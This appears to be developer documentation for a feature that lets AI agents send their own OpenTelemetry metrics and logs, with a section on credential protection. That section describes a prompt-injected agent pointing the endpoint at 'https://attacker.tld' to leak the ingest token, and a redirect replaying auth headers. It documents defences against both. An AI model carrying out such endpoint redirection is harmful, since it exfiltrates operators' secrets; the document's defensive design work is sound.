# Agent-authored OTel telemetry

`bobi agent <name> otel` lets an agent record **telemetry of its own choosing**
- a count, a duration, a structured observation - to any OTLP endpoint, so you
can dashboard and alert on what your agents actually do.

The agent decides what is worth recording.
Bobi supplies the wire format and the fleet identity labels the agent could not
resolve for itself.

```
bobi agent <n> otel metric <name> <value> [--kind counter|gauge|histogram]
                                          [--temporality delta|cumulative]
                                          [--attr k=v]... [--unit s] [--desc "..."]
bobi agent <n> otel log <body> [--severity debug|info|warn|error|fatal] [--attr k=v]...
bobi agent <n> otel check [--send]
```

This is **opt-in per team**, and deliberately not advertised in every agent's
default prompt.
Add it to a team's `agent.yaml`:

```yaml
tool_library:
  - otel
```

That ships the agent-facing guide as `tools/otel.md`.
There is nothing to install: the OTLP wire types are a core bobi dependency.

## Mint a write-only, per-instance token first

**Do this before anything else.**
Create an OTLP ingest token that can **write only**, scoped to **one instance**.
Never reuse a stack-admin token, and never share one token across the fleet.

The reason is specific.
`docs/SECURITY.md` accepts that a prompt-injected agent could exfiltrate *its
own instance's* tokens, mitigated by scoped per-instance tokens.
A Grafana Cloud OTLP token is typically **stack-scoped** and identical on every
box, so pasting one into the fleet would move the blast radius from a single
instance to your organization's entire observability plane.
That is a change to the security model, not an instance of it.

The command is assumed to be attacker-invoked - the agents that call it run
with broad permissions and process untrusted input from GitHub, Slack, Linear,
and webhooks.
The controls in "How the credential is protected" below are what make that
assumption survivable; the token's scope is what bounds it if they fail.

## Configuration

Everything is read from spec-standard `OTEL_*` environment variables, in
`run/.env` or the process environment.
There is no `agent.yaml` schema for it and no `--endpoint` flag: a flag would
turn `otel check` into a convenient port prober, and env-only configuration is
what makes credential origin-pinning (below) meaningful.

| Variable | Meaning |
|---|---|
| `OTEL_EXPORTER_OTLP_ENDPOINT` | Base URL. `/v1/metrics` or `/v1/logs` is appended; a trailing `/` is stripped first. |
| `OTEL_EXPORTER_OTLP_METRICS_ENDPOINT` / `_LOGS_ENDPOINT` | Full per-signal URL, used **verbatim** with no path appended. Wins over the base. |
| `OTEL_EXPORTER_OTLP_HEADERS` | `k=v,k=v` per W3C Baggage. Percent-decoded, split on the first `=` only. |
| `OTEL_EXPORTER_OTLP_METRICS_HEADERS` / `_LOGS_HEADERS` | Per-signal headers. Replace the base value for that signal. |
| `OTEL_EXPORTER_OTLP_PROTOCOL` | Only `http/protobuf` (or unset). `grpc` is an error, never a silent HTTP attempt at a gRPC port. |
| `OTEL_EXPORTER_OTLP_TIMEOUT` | Milliseconds. Default `10000`, matching every other outbound call in bobi. |
| `OTEL_RESOURCE_ATTRIBUTES` | `k=v,k=v` merged into the resource. Bobi's identity attributes win on conflict. |
| `OTEL_SERVICE_NAME` | Overrides `service.name`. Default `bobi`. |

Three states are reported distinctly, so a box without observability does not
look broken:

- **unconfigured** - no endpoint anywhere. Names `OTEL_EXPORTER_OTLP_ENDPOINT`.
- **misconfigured** - a setting that cannot work (a `grpc` protocol, a URL with
  no scheme, a non-numeric timeout). Names the variable.
- **configured** - exports run.

### Grafana Cloud

```bash
OTEL_EXPORTER_OTLP_ENDPOINT=https://otlp-gateway-prod-us-east-0.grafana.net/otlp
OTEL_EXPORTER_OTLP_HEADERS=Authorization=Basic <base64 of instanceID:token>
```

Paste the documented value with or without its trailing slash; both resolve to
`.../otlp/v1/metrics`.
The base64 carries `=` padding and decodes to a value containing a space, both
of which survive header parsing intact.

### Honeycomb, and other custom-header vendors

```bash
OTEL_EXPORTER_OTLP_ENDPOINT=https://api.honeycomb.io
OTEL_EXPORTER_OTLP_HEADERS=x-honeycomb-team=<ingest key>
```

The same shape covers `api-key` (New Relic), `signoz-ingestion-key`, and
`uptrace-dsn`.
See "No redirects" below for why a custom header name gets specific handling.

## Running a collector

The simplest deployment is an OpenTelemetry Collector next to your agents,
holding the vendor credential so no instance has to.

Write `otel-config.yaml`:

```yaml
receivers:
  otlp:
    protocols:
      http:
        endpoint: 0.0.0.0:4318

exporters:
  debug:
    verbosity: detailed

service:
  pipelines:
    metrics:
      receivers: [otlp]
      exporters: [debug]
    logs:
      receivers: [otlp]
      exporters: [debug]
```

Run it:

```bash
docker run --rm -p 4318:4318 \
  -v "$PWD/otel-config.yaml:/etc/otelcol/config.yaml" \
  otel/opentelemetry-collector:0.144.0 \
  --config /etc/otelcol/config.yaml
```

Then point an instance at it and confirm the round trip:

```bash
OTEL_EXPORTER_OTLP_ENDPOINT=http://localhost:4318 \
  bobi agent <name> otel check --send
```

`debug` prints what arrived, which is what you want while wiring things up.
Swap it for your real exporter once signals are landing.
The same collector config is what
`tests/integration/test_otel_collector.py` brings up, so it stays honest.

### Delta temporality and Prometheus-native backends

A one-shot CLI cannot maintain a running total, so counters and histograms
default to **delta** temporality with `start_time_unix_nano == time_unix_nano`
- a one-shot process has no interval to report.

A Prometheus-native backend (Mimir, Prometheus with OTLP ingest) wants
cumulative.
Convert in the collector:

```yaml
processors:
  deltatocumulative:
    max_stale: 5m
```

Tune `max_stale` to how often your agents actually emit.
Too short and a series resets between emissions; too long and a retired series
lingers.

The alternative is for the agent to declare `--temporality cumulative` when it
genuinely knows its total ("42 tickets today"), which reaches a
Prometheus-native backend with no collector hop.
Note that this is a *claim*: nothing verifies the number is really monotonic,
and a wrong claim corrupts the series.

### The degenerate histogram

`--kind histogram` from a one-shot process emits `count=1, sum=v, min=v, max=v,
explicit_bounds=[], bucket_counts=[1]` - a single observation in one unbounded
bucket.

This is deliberate.
It exists so a backend that pre-aggregates duration histograms receives the
right **instrument type**, not to convey a distribution.
If you want real distributions, aggregate in the collector.

## Resource attributes

Stamped on every emission, mapped onto OTel semantic conventions where one
exists.
Framework attributes are applied **last**, so neither `--attr` nor
`OTEL_RESOURCE_ATTRIBUTES` can forge one.

| Attribute | Source |
|---|---|
| `service.name` | `OTEL_SERVICE_NAME`, default `bobi` |
| `service.version` | the installed bobi version |
| `service.instance.id` | identity `instance` |
| `bobi.fleet` | identity `fleet` |
| `bobi.platform` | `fly` / `k8s` / `docker` / `unknown` |
| `bobi.agent` | the `<name>` argument of the `agent` group |
| `bobi.team` | the `agent:` key from `package/agent.yaml`; **omitted** when absent |
| `host.id` / `cloud.region` / `k8s.node.name` | identity `machine` / `region` / `node`; omitted when null |

`service.instance.id` and `bobi.agent` are usually the **same string**.
That is expected: the former is the semconv key external tooling looks for, the
latter is bobi's own dimension.

There is deliberately **no session or run id** - no such value exists in an
agent's environment.
An agent that wants run correlation passes it with `--attr`.

## How the credential is protected

### Origin-pinning

Process environment beats `run/.env` for every bobi setting, which for this
command would otherwise be a courier bug: an agent that can set
`OTEL_EXPORTER_OTLP_ENDPOINT=https://attacker.tld` would make bobi POST the
box's real write token to the attacker - a secret the agent never had to read.

So the endpoint is resolved from `run/.env` and from the process environment
**separately**.
When the credential comes from `run/.env` but the endpoint in use does not share
`run/.env`'s scheme, host, and port, **no configured headers are sent** and a
one-line notice says the credential was withheld.
The export still goes out, unauthenticated, and usually fails at the far end -
which is the intended, visible outcome.

A caller supplying its own headers to its own endpoint is unaffected: nothing of
yours is at risk, so nothing is withheld.

### No redirects

The export POST does not follow redirects.
httpx strips only `Authorization` and `Cookie` on a cross-origin redirect, so a
single 307 would replay a `x-honeycomb-team` / `api-key` /
`signoz-ingestion-key` header verbatim to whatever host the redirect names -
with no agent compromise at all.
A 3xx is a hard failure that names the redirect target's host.

(Following it would also be wrong on correctness grounds: httpx rewrites a
redirected POST to a GET and drops the body, so a misrouted export would look
successful.)

### Nothing secret is printed

`otel check` prints header **names** with every value rendered as `<set>`.
Tool output becomes part of the agent's transcript and is rendered in the
operator console, so this leaks on the *benign* path - an agent debugging a 401
in good faith would otherwise print your ingest token.

### Remote responses are untrusted and bounded

A non-2xx body, or a `partial_success.error_message`, is remote-controlled
input reaching the agent's context.
It is capped at 200 bytes, stripped of control characters and ANSI escapes, and
prefixed with the literal `remote response (untrusted):`.

### Bounds, and what they do not bound

Metric names match `^[a-zA-Z0-9_.]{1,64}$`; at most 20 attributes, keys <=64
bytes and values <=256 bytes; log bodies <=8192 bytes (refused, never
truncated); values must be finite; `service.*`, `bobi.*`, `host.*`, `cloud.*`,
`k8s.*`, `le`, `quantile`, and `__*` attribute keys are rejected.

**These bound shape, not rate, and that is deliberate.**
Read the residual plainly before you enable this:

- The name regex constrains *shape*, not *distinctness*: `uuidgen | tr -d -`
  passes it.
- Nothing bounds distinct attribute **values**, which is where cardinality
  actually explodes.
- There is no emission-rate limit. Each invocation is a fresh process emitting
  one data point, so a per-process cap would bound nothing, and a
  cross-invocation limiter needs exactly the durable state the no-spool
  decision rules out.
- Failures are loud with no backoff, so a model that observes a failure
  retries - as a fresh process each time.

The mitigations that actually work are operator-side, and you should have both
before pointing a fleet at a metered backend:

1. A **revocable, write-only, per-instance** ingest token, so a runaway is
   stopped by revoking one credential rather than by redeploying agents.
2. A **collector- or vendor-side ingest quota** - a rate limit on the receiver,
   or a spend cap on the tenant. Running your own collector in front of the
   vendor is the cheapest place to put one.

Rate limiting inside bobi is a deferred follow-up.

## What this is not

- **Not tracing.** No spans and no trace context: a one-shot CLI has no context
  to hold open.
- **Not durable.** No disk spool and no retry. A failed export is gone, loudly.
  Telemetry is best-effort by construction.
- **Not auto-instrumentation.** Bobi's own runtime is not exported as traces.
  That is a different feature with a different risk profile, and it could only
  ever emit what the framework knows - never what the agent judged significant.
